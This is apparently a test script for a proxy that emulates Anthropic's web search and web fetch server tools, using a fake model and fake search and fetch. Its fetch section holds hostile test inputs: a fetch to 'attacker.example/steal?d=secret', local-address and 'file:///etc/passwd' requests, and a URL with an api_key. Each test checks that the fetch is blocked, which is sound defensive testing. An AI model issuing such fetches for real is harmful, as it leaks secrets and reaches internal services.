// TRouteAI's own run of Anthropic's web search server tool (src/sse/handlers/webSearchEmulation.ts)
// with a fake model and a fake search: no network, temporary DATA_DIR.
// Run from the repository root:
//   DATA_DIR=$(mktemp -d) npx tsx --tsconfig tsconfig.json tests/checks/check-web-search.mts
import {
  hasClaudeServerWebSearchTool,
  runWebSearchEmulation,
  webSearchNeedsEmulation,
} from "../../src/sse/handlers/webSearchEmulation.ts";
import { createCombo } from "../../src/lib/db/combos.ts";
import { initTranslators, translateRequest } from "../../open-sse/translator/index.ts";
import { decodeWebSearchContent } from "../../open-sse/services/webSearchResultText.ts";

let failed = 0;
const check = (name: string, ok: boolean, detail = "") => {
  if (!ok) failed++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? `  (${detail})` : ""}`);
};
const realLog = console.log;
console.warn = () => {};

const json = (v: unknown, status = 200) =>
  new Response(JSON.stringify(v), { status, headers: { "content-type": "application/json" } });
const msg = (content: unknown[], extra: Record<string, unknown> = {}) => ({
  id: "msg_1",
  type: "message",
  role: "assistant",
  model: "claude-opus-5.5",
  content,
  stop_reason: content.some((b: any) => b.type === "tool_use") ? "tool_use" : "end_turn",
  stop_sequence: null,
  usage: { input_tokens: 100, output_tokens: 10 },
  ...extra,
});
const ITEMS = [
  {
    title: "Node.js 24 LTS",
    url: "https://nodejs.org/en/blog/release/v24.11.0",
    snippet: "Node 24 is LTS",
    pageText: "Node.js 24.11.0 (LTS) released",
  },
  {
    title: "Releases",
    url: "https://nodejs.org/en/about/previous-releases",
    snippet: "Release schedule",
    pageText: "",
  },
];
const WS_TOOL = { type: "web_search_20250305", name: "web_search", max_uses: 3 };
const base = (extra: Record<string, unknown> = {}) => ({
  model: "kiro/claude-opus-5.5",
  max_tokens: 1000,
  system: "You are an assistant for performing a web search tool use",
  messages: [{ role: "user", content: "Perform a web search for the query: newest Node.js LTS" }],
  tools: [WS_TOOL],
  ...extra,
});

// A scripted model: first turn calls web_search, second answers using the result text it got.
function scriptedModel(turns: Array<(body: any) => unknown>) {
  const seen: any[] = [];
  return {
    seen,
    call: async (body: any) => {
      seen.push(structuredClone(body));
      const t = turns[Math.min(seen.length - 1, turns.length - 1)];
      const out = t(body);
      return out instanceof Response ? out : json(out);
    },
  };
}
const searchTurn =
  (query = "newest Node.js LTS") =>
  () =>
    msg([
      { type: "thinking", thinking: "I should search", signature: "SIG1" },
      { type: "text", text: "Let me search." },
      { type: "tool_use", id: "toolu_1", name: "web_search", input: { query } },
    ]);
const answerTurn = (body: any) => {
  const last = body.messages[body.messages.length - 1];
  const text = String(last?.content?.[0]?.content || "");
  return msg([
    {
      type: "text",
      text: text.includes("24.11.0")
        ? "Node.js 24 is the newest LTS (nodejs.org)."
        : "no results seen",
    },
  ]);
};

// 1. Detection
check(
  "detects the dated server tool only",
  hasClaudeServerWebSearchTool(base()) &&
    !hasClaudeServerWebSearchTool(
      base({ tools: [{ name: "web_search", description: "x", input_schema: {} }] })
    )
);
await createCombo({ name: "opus-kiro", strategy: "round-robin", models: ["kiro/claude-opus-5.5"] });
await createCombo({
  name: "mixed",
  strategy: "priority",
  models: ["claude/claude-sonnet-5-5", "kiro/claude-opus-5.5"],
});
await createCombo({
  name: "native-only",
  strategy: "priority",
  models: ["claude/claude-sonnet-5-5"],
});
await createCombo({
  name: "nested",
  strategy: "priority",
  models: [{ kind: "combo-ref", comboName: "opus-kiro" }],
});
check(
  "Kiro model, Kiro combo, mixed combo, nested combo: emulated",
  (await webSearchNeedsEmulation("kiro/claude-opus-5.5")) &&
    (await webSearchNeedsEmulation("opus-kiro")) &&
    (await webSearchNeedsEmulation("mixed")) &&
    (await webSearchNeedsEmulation("nested"))
);
check(
  "Claude subscription model / combo: native (not emulated)",
  !(await webSearchNeedsEmulation("claude/claude-sonnet-5-5")) &&
    !(await webSearchNeedsEmulation("native-only"))
);

// 2. Non-streaming
{
  const m = scriptedModel([searchTurn(), answerTurn]);
  const res = await runWebSearchEmulation({
    request: {},
    body: base(),
    callModel: m.call,
    search: async () => structuredClone(ITEMS),
  });
  const j = await res.json();
  const types = j.content.map((b: any) => b.type).join(",");
  check(
    "non-stream: thinking, text, server_tool_use, web_search_tool_result, text",
    types === "thinking,text,server_tool_use,web_search_tool_result,text",
    types
  );
  const stu = j.content.find((b: any) => b.type === "server_tool_use");
  const wsr = j.content.find((b: any) => b.type === "web_search_tool_result");
  check(
    "server_tool_use: srvtoolu_ id, name web_search, the query",
    /^srvtoolu_/.test(stu.id) &&
      stu.name === "web_search" &&
      stu.input.query === "newest Node.js LTS"
  );
  check(
    "web_search_tool_result: tool_use_id matches, results with title / url / encrypted_content / page_age",
    wsr.tool_use_id === stu.id &&
      wsr.content.length === 2 &&
      wsr.content[0].type === "web_search_result" &&
      wsr.content[0].url === ITEMS[0].url &&
      "page_age" in wsr.content[0] &&
      decodeWebSearchContent(wsr.content[0].encrypted_content).pageText.includes("24.11.0")
  );
  check(
    "the model got the results and answered from them",
    /Node.js 24/.test(j.content.at(-1).text) && m.seen.length === 2
  );
  const turn1 = m.seen[0];
  check(
    "model turns: stream false, server tool replaced by a web_search function",
    turn1.stream === false &&
      turn1.tools.length === 1 &&
      turn1.tools[0].name === "web_search" &&
      turn1.tools[0].input_schema.required[0] === "query" &&
      !turn1.tools[0].type
  );
  const turn2 = m.seen[1];
  check(
    "second turn: assistant blocks (thinking with signature, tool_use) + tool_result",
    turn2.messages.at(-2).role === "assistant" &&
      turn2.messages.at(-2).content[0].signature === "SIG1" &&
      turn2.messages.at(-1).content[0].type === "tool_result" &&
      turn2.messages.at(-1).content[0].tool_use_id === "toolu_1"
  );
  check(
    "usage: both turns summed + server_tool_use.web_search_requests 1, stop end_turn",
    j.usage.input_tokens === 200 &&
      j.usage.output_tokens === 20 &&
      j.usage.server_tool_use.web_search_requests === 1 &&
      j.stop_reason === "end_turn" &&
      j.stop_details === null
  );
}

// 3. Streaming
{
  const m = scriptedModel([searchTurn(), answerTurn]);
  const res = await runWebSearchEmulation({
    request: {},
    body: base({ stream: true }),
    callModel: m.call,
    search: async () => structuredClone(ITEMS),
  });
  const text = await res.text();
  const events = text
    .split("\n\n")
    .filter(Boolean)
    .map((b) => ({
      ev: /^event: (.+)$/m.exec(b)?.[1],
      data: JSON.parse(/^data: (.+)$/m.exec(b)?.[1] || "{}"),
    }));
  const names = events.map((e) => e.ev).filter((n) => n !== "ping");
  check(
    "stream: text/event-stream, message_start first, message_delta + message_stop last",
    res.headers.get("content-type") === "text/event-stream" &&
      names[0] === "message_start" &&
      names.at(-2) === "message_delta" &&
      names.at(-1) === "message_stop",
    names.join(",")
  );
  const starts = events
    .filter((e) => e.ev === "content_block_start")
    .map((e) => e.data.content_block.type);
  check(
    "stream: blocks in order",
    starts.join(",") === "thinking,text,server_tool_use,web_search_tool_result,text",
    starts.join(",")
  );
  const stuIdx = events.find(
    (e) => e.ev === "content_block_start" && e.data.content_block.type === "server_tool_use"
  )!.data.index;
  const query = events
    .filter((e) => e.ev === "content_block_delta" && e.data.index === stuIdx)
    .map((e) => e.data.delta.partial_json)
    .join("");
  check(
    "stream: server_tool_use input arrives as input_json_delta",
    JSON.parse(query).query === "newest Node.js LTS"
  );
  check(
    "stream: every block started is stopped, signature_delta for thinking",
    events.filter((e) => e.ev === "content_block_start").length ===
      events.filter((e) => e.ev === "content_block_stop").length &&
      events.some((e) => e.data?.delta?.type === "signature_delta")
  );
  const md = events.find((e) => e.ev === "message_delta")!.data;
  check(
    "stream: message_delta usage has web_search_requests",
    md.usage.server_tool_use.web_search_requests === 1 && md.delta.stop_reason === "end_turn"
  );
}

// 4. Limits, failures, errors
{
  const loop = scriptedModel([
    searchTurn("a"),
    searchTurn("b"),
    searchTurn("c"),
    searchTurn("d"),
    answerTurn,
  ]);
  let searches = 0;
  const j = await (
    await runWebSearchEmulation({
      request: {},
      body: base(),
      callModel: loop.call,
      search: async () => {
        searches++;
        return structuredClone(ITEMS);
      },
    })
  ).json();
  const errs = j.content.filter(
    (b: any) => b.type === "web_search_tool_result" && !Array.isArray(b.content)
  );
  check(
    "max_uses 3: three searches, the fourth gets max_uses_exceeded, the model then answers without the tool",
    searches === 3 &&
      errs.length === 1 &&
      errs[0].content.error_code === "max_uses_exceeded" &&
      !loop.seen.at(-1).tools &&
      j.stop_reason === "end_turn",
    `searches ${searches}, last tools ${JSON.stringify(loop.seen.at(-1).tools)}`
  );

  const fallback = scriptedModel([
    searchTurn(),
    (body: any) =>
      msg([{ type: "text", text: `native answer via ${body.model}` }], {
        model: "claude-sonnet-5-5",
      }),
  ]);
  const fb = await (
    await runWebSearchEmulation({
      request: {},
      body: base(),
      callModel: fallback.call,
      search: async () => {
        throw new Error("down");
      },
      nativeModel: async () => "claude/claude-sonnet-5-5",
    })
  ).json();
  check(
    "no search works: the whole request goes to the native web search model (with the server tool)",
    fallback.seen.length === 2 &&
      fallback.seen[1].model === "claude/claude-sonnet-5-5" &&
      fallback.seen[1].tools[0].type === "web_search_20250305" &&
      /native answer/.test(fb.content[0].text)
  );

  const none = scriptedModel([searchTurn(), answerTurn]);
  const nj = await (
    await runWebSearchEmulation({
      request: {},
      body: base(),
      callModel: none.call,
      search: async () => {
        throw new Error("down");
      },
      nativeModel: async () => null,
    })
  ).json();
  const nerr = nj.content.find((b: any) => b.type === "web_search_tool_result");
  check(
    "no search and no native model: error block unavailable, the model still answers",
    nerr?.content?.error_code === "unavailable" &&
      none.seen.length === 2 &&
      none.seen[1].messages.at(-1).content[0].is_error === true &&
      nj.stop_reason === "end_turn"
  );

  const bad = scriptedModel([
    () => json({ type: "error", error: { type: "rate_limit_error", message: "slow down" } }, 429),
  ]);
  const br = await runWebSearchEmulation({
    request: {},
    body: base({ stream: true }),
    callModel: bad.call,
    search: async () => ITEMS,
  });
  check(
    "first model turn fails: its own status and error come back (no stream started)",
    br.status === 429 && (await br.json()).error.type === "rate_limit_error"
  );

  const direct = scriptedModel([() => msg([{ type: "text", text: "I know this already" }])]);
  const dj = await (
    await runWebSearchEmulation({
      request: {},
      body: base(),
      callModel: direct.call,
      search: async () => {
        throw new Error("must not search");
      },
    })
  ).json();
  check(
    "the model answers without searching: plain answer, 0 searches",
    dj.content.length === 1 && dj.usage.server_tool_use.web_search_requests === 0
  );

  const mixedTools = scriptedModel([
    () =>
      msg([
        { type: "tool_use", id: "toolu_s", name: "web_search", input: { query: "x" } },
        { type: "tool_use", id: "toolu_c", name: "Bash", input: { command: "ls" } },
      ]),
  ]);
  const mj = await (
    await runWebSearchEmulation({
      request: {},
      body: base({
        tools: [
          WS_TOOL,
          { name: "Bash", description: "run", input_schema: { type: "object", properties: {} } },
        ],
      }),
      callModel: mixedTools.call,
      search: async () => ITEMS,
    })
  ).json();
  check(
    "a client tool call next to a search: search runs, client tool_use returned with stop tool_use",
    mj.stop_reason === "tool_use" &&
      mj.content.map((b: any) => b.type).join(",") ===
        "server_tool_use,web_search_tool_result,tool_use" &&
      mixedTools.seen.length === 1
  );

  let domains: any = null;
  const dm = scriptedModel([searchTurn(), answerTurn]);
  await runWebSearchEmulation({
    request: {},
    body: base({
      tools: [{ ...WS_TOOL, allowed_domains: ["nodejs.org"], blocked_domains: ["spam.com"] }],
    }),
    callModel: dm.call,
    search: async (_q, opts) => {
      domains = opts;
      return ITEMS;
    },
  });
  check(
    "allowed / blocked domains reach the search",
    domains?.allowed?.[0] === "nodejs.org" && domains?.blocked?.[0] === "spam.com"
  );
}

// 5. Earlier web search blocks in history reach Kiro / OpenAI targets as text
{
  initTranslators();
  const j = await (
    await runWebSearchEmulation({
      request: {},
      body: base(),
      callModel: scriptedModel([searchTurn(), answerTurn]).call,
      search: async () => structuredClone(ITEMS),
    })
  ).json();
  const history = {
    model: "claude-sonnet-5",
    max_tokens: 100,
    messages: [
      { role: "user", content: "q" },
      { role: "assistant", content: j.content },
      { role: "user", content: "and older versions?" },
    ],
  };
  const sent = JSON.stringify(
    translateRequest(
      "claude",
      "kiro",
      "claude-sonnet-5",
      history,
      true,
      { providerSpecificData: {} },
      "kiro"
    )
  );
  check(
    "history with server_tool_use / web_search_tool_result: query, titles, URLs and page text go to Kiro as text",
    sent.includes("Searched the web for: newest Node.js LTS") &&
      sent.includes("https://nodejs.org/en/blog/release/v24.11.0") &&
      sent.includes("24.11.0 (LTS) released")
  );
}

// 8. Web fetch (web_fetch_YYYYMMDD): TRouteAI opens the URL; only URLs from earlier context
{
  const { hasClaudeServerWebTool } = await import("../../src/sse/handlers/webSearchEmulation.ts");
  const WF_TOOL = {
    type: "web_fetch_20250910",
    name: "web_fetch",
    max_uses: 2,
    citations: { enabled: true },
  };
  const PAGE = "https://example.org/guide";
  const fbase = (extra: Record<string, unknown> = {}) => ({
    model: "kiro/claude-sonnet-5",
    max_tokens: 1000,
    messages: [{ role: "user", content: `Read ${PAGE} and tell me the version it names.` }],
    tools: [WF_TOOL],
    ...extra,
  });
  check(
    "detects web_fetch_YYYYMMDD as a server tool",
    hasClaudeServerWebTool(fbase()) && !hasClaudeServerWebSearchTool(fbase())
  );
  const fetchTurn =
    (url: string, id = "toolu_f1") =>
    () =>
      msg([{ type: "tool_use", id, name: "web_fetch", input: { url } }]);
  const fetchedAnswer = (body: any) => {
    const last = body.messages.at(-1).content[0];
    const parts = Array.isArray(last.content) ? last.content : [];
    const doc = parts.find((p: any) => p.type === "document");
    return msg([
      {
        type: "text",
        text: doc?.source?.data?.includes("version 7.3")
          ? "It names version 7.3."
          : `no page (${typeof last.content === "string" ? last.content.slice(0, 60) : "?"})`,
      },
    ]);
  };
  const fetched: string[] = [];
  const fakeFetch = async (url: string, maxChars: number) => {
    fetched.push(url);
    return {
      ok: true as const,
      url,
      title: "Guide",
      text: `The guide covers version 7.3. See https://example.org/next for more.`.slice(
        0,
        maxChars
      ),
    };
  };
  const m = scriptedModel([fetchTurn(PAGE), fetchedAnswer]);
  const j = await (
    await runWebSearchEmulation({ request: {}, body: fbase(), callModel: m.call, fetch: fakeFetch })
  ).json();
  const types = j.content.map((b: any) => b.type).join(",");
  const stu = j.content.find((b: any) => b.type === "server_tool_use");
  const wfr = j.content.find((b: any) => b.type === "web_fetch_tool_result");
  check(
    "web fetch: server_tool_use (name web_fetch, url), web_fetch_tool_result, text",
    types === "server_tool_use,web_fetch_tool_result,text" &&
      stu.name === "web_fetch" &&
      stu.input.url === PAGE,
    types
  );
  check(
    "web_fetch_result: url, document (text/plain, title, citations), retrieved_at",
    wfr.tool_use_id === stu.id &&
      wfr.content.type === "web_fetch_result" &&
      wfr.content.url === PAGE &&
      wfr.content.content.type === "document" &&
      wfr.content.content.source.media_type === "text/plain" &&
      wfr.content.content.title === "Guide" &&
      wfr.content.content.citations?.enabled === true &&
      !Number.isNaN(Date.parse(wfr.content.retrieved_at))
  );
  check(
    "the model got the page as a document and answered; usage web_fetch_requests 1",
    /version 7.3/.test(j.content.at(-1).text) &&
      j.usage.server_tool_use.web_fetch_requests === 1 &&
      !("web_search_requests" in j.usage.server_tool_use)
  );
  check(
    "model turn: web_fetch function with a url parameter",
    m.seen[0].tools.length === 1 &&
      m.seen[0].tools[0].name === "web_fetch" &&
      m.seen[0].tools[0].input_schema.required[0] === "url"
  );

  fetched.length = 0;
  const made = scriptedModel([fetchTurn("https://attacker.example/steal?d=secret"), fetchedAnswer]);
  const jm = await (
    await runWebSearchEmulation({
      request: {},
      body: fbase(),
      callModel: made.call,
      fetch: fakeFetch,
    })
  ).json();
  const errm = jm.content.find((b: any) => b.type === "web_fetch_tool_result");
  check(
    "URL not in prior context: url_not_in_prior_context, nothing fetched",
    errm.content.type === "web_fetch_tool_result_error" &&
      errm.content.error_code === "url_not_in_prior_context" &&
      fetched.length === 0
  );
  const codeFor = async (url: string, extra: Record<string, unknown> = {}) => {
    const mm = scriptedModel([fetchTurn(url), fetchedAnswer]);
    const body = fbase({ messages: [{ role: "user", content: `Open ${url}` }], ...extra });
    const r = await (
      await runWebSearchEmulation({ request: {}, body, callModel: mm.call, fetch: fakeFetch })
    ).json();
    return r.content.find((b: any) => b.type === "web_fetch_tool_result")?.content?.error_code;
  };
  check(
    "private address: url_not_allowed",
    (await codeFor("http://127.0.0.1:20017/api/keys")) === "url_not_allowed" &&
      (await codeFor("http://192.168.1.5/")) === "url_not_allowed" &&
      (await codeFor("http://localhost/x")) === "url_not_allowed"
  );
  check(
    "non-http scheme: invalid_tool_input",
    (await codeFor("file:///etc/passwd")) === "invalid_tool_input"
  );
  check(
    "URL over 250 characters: url_too_long",
    (await codeFor(`https://example.org/${"a".repeat(260)}`)) === "url_too_long"
  );
  check(
    "blocked_domains / allowed_domains: url_not_allowed",
    (await codeFor("https://bad.example/x", {
      tools: [{ ...WF_TOOL, blocked_domains: ["bad.example"] }],
    })) === "url_not_allowed" &&
      (await codeFor("https://other.example/x", {
        tools: [{ ...WF_TOOL, allowed_domains: ["example.org"] }],
      })) === "url_not_allowed"
  );
  const credUrl = "https://api.example.org/data?api_key=XYZ123";
  const cm = scriptedModel([fetchTurn(credUrl), fetchedAnswer]);
  const cbody = fbase({
    messages: [
      { role: "user", content: "check the data" },
      {
        role: "assistant",
        content: [{ type: "tool_use", id: "toolu_c", name: "Bash", input: { command: "cat cfg" } }],
      },
      {
        role: "user",
        content: [{ type: "tool_result", tool_use_id: "toolu_c", content: `url=${credUrl}` }],
      },
    ],
    tools: [
      WF_TOOL,
      { name: "Bash", description: "b", input_schema: { type: "object", properties: {} } },
    ],
  });
  const cj = await (
    await runWebSearchEmulation({ request: {}, body: cbody, callModel: cm.call, fetch: fakeFetch })
  ).json();
  check(
    "URL with a credential seen only in a tool result: url_not_allowed",
    cj.content.find((b: any) => b.type === "web_fetch_tool_result")?.content?.error_code ===
      "url_not_allowed"
  );
  const nm = scriptedModel([fetchTurn("https://example.org/from-tool"), fetchedAnswer]);
  const nbody = fbase({
    messages: [
      { role: "user", content: "check" },
      {
        role: "assistant",
        content: [{ type: "tool_use", id: "toolu_n", name: "Bash", input: {} }],
      },
      {
        role: "user",
        content: [
          {
            type: "tool_result",
            tool_use_id: "toolu_n",
            content: "see https://example.org/from-tool",
          },
        ],
      },
    ],
    tools: [
      { ...WF_TOOL, url_sources: { client_tool_results: { type: "none" } } },
      { name: "Bash", description: "b", input_schema: { type: "object", properties: {} } },
    ],
  });
  const nj = await (
    await runWebSearchEmulation({ request: {}, body: nbody, callModel: nm.call, fetch: fakeFetch })
  ).json();
  check(
    "url_sources client_tool_results none: a URL from a tool result is not fetchable",
    nj.content.find((b: any) => b.type === "web_fetch_tool_result")?.content?.error_code ===
      "url_not_in_prior_context"
  );
  fetched.length = 0;
  const chain = scriptedModel([
    fetchTurn(PAGE),
    fetchTurn("https://example.org/next", "toolu_f2"),
    fetchTurn(PAGE, "toolu_f3"),
    fetchedAnswer,
  ]);
  const chj = await (
    await runWebSearchEmulation({
      request: {},
      body: fbase(),
      callModel: chain.call,
      fetch: fakeFetch,
    })
  ).json();
  const codes = chj.content
    .filter((b: any) => b.type === "web_fetch_tool_result")
    .map((b: any) => (b.content.type === "web_fetch_result" ? "ok" : b.content.error_code));
  check(
    "a link from the fetched page is fetchable; the third fetch gets max_uses_exceeded",
    codes.join(",") === "ok,ok,max_uses_exceeded" &&
      fetched.length === 2 &&
      !chain.seen.at(-1).tools,
    codes.join(",")
  );
  const both = scriptedModel([searchTurn(), fetchTurn(ITEMS[0].url), fetchedAnswer]);
  const bj = await (
    await runWebSearchEmulation({
      request: {},
      body: base({ tools: [WS_TOOL, WF_TOOL] }),
      callModel: both.call,
      search: async () => structuredClone(ITEMS),
      fetch: fakeFetch,
    })
  ).json();
  const btypes = bj.content
    .filter((b: any) => b.type !== "thinking" && b.type !== "text")
    .map((b: any) => b.type)
    .join(",");
  check(
    "search then fetch of a result URL: both blocks, usage counts both",
    btypes === "server_tool_use,web_search_tool_result,server_tool_use,web_fetch_tool_result" &&
      bj.usage.server_tool_use.web_search_requests === 1 &&
      bj.usage.server_tool_use.web_fetch_requests === 1,
    btypes
  );
  const sm = scriptedModel([fetchTurn(PAGE), fetchedAnswer]);
  const st = await (
    await runWebSearchEmulation({
      request: {},
      body: fbase({ stream: true }),
      callModel: sm.call,
      fetch: fakeFetch,
    })
  ).text();
  const sev = st
    .split("\n\n")
    .filter(Boolean)
    .map((b) => ({
      ev: /^event: (.+)$/m.exec(b)?.[1],
      data: JSON.parse(/^data: (.+)$/m.exec(b)?.[1] || "{}"),
    }));
  const sstarts = sev
    .filter((e) => e.ev === "content_block_start")
    .map((e) => e.data.content_block.type);
  check(
    "stream: server_tool_use, web_fetch_tool_result (whole block in content_block_start), text",
    sstarts.join(",") === "server_tool_use,web_fetch_tool_result,text" &&
      sev.find((e) => e.data?.content_block?.type === "web_fetch_tool_result")?.data.content_block
        .content.url === PAGE,
    sstarts.join(",")
  );
  initTranslators();
  const hist = translateRequest(
    "claude",
    "kiro",
    "claude-sonnet-5",
    {
      model: "claude-sonnet-5",
      max_tokens: 100,
      messages: [
        { role: "user", content: `Read ${PAGE}` },
        { role: "assistant", content: [stu, wfr, { type: "text", text: "It names version 7.3." }] },
        { role: "user", content: "And what else?" },
      ],
    },
    true,
    { providerSpecificData: {} },
    "kiro"
  );
  const hs = JSON.stringify(hist);
  check(
    "history: earlier web fetch blocks reach Kiro as text (url + page text)",
    hs.includes(`[Fetched the web page: ${PAGE}]`) &&
      hs.includes("The guide covers version 7.3") &&
      !hs.includes("web_fetch_tool_result")
  );
}

realLog(failed ? `\n${failed} FAILED` : "\nall passed");
process.exit(failed ? 1 : 0);
